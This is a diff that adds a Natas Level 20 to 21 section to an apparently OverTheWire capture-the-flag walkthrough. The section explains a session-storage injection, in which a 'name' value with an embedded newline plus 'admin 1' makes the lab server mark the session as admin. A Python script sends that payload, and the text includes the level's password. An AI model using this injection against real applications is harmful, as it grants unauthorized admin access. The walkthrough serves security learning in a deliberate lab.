@@ -640,9 +640,47 @@ for i in range(start, end + 1):
 
 3. Input test credentials to enable the PHPSESSID cookie and then replace its value with the obtained `admin` cookie value and you'll get the password for the next level.
 
+### Natas Level 20 → Level 21
+**Key Takeaways**  
+The PHPSESSID in this level is not predictable. If you can add a newline and a admin 1 line into the stored data, the server will treat your session as admin and reveal the natas21 password.
 
+**Procedure**
 
+1. Log in using the username `natas20` and the password from Level 19.
 
+2. POST a `name` value that contains a newline followed by `admin 1` (for example: `plzsub\nadmin 1`), then request the page and read the admin-only content.
+
+3. Sample script:
+
+```
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests
+
+username = "natas20"
+password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"
+
+url = f"http://{username}.natas.labs.overthewire.org/?debug=true"
+
+session = requests.Session()
+
+# initial GET
+resp = session.get(url, auth=(username, password), timeout=10)
+print(resp.text)
+print("=" * 80)
+
+# POST payload (subscribe + admin toggle)
+resp = session.post(url, data={"name": "plzsub\nadmin 1"}, auth=(username, password), timeout=10)
+print(resp.text)
+print("=" * 80)
+
+# final GET to observe changes
+resp = session.get(url, auth=(username, password), timeout=10)
+print(resp.text)
+print("=" * 80)
+```
+The password for the next level will be found in the content of the page.
 
 
 
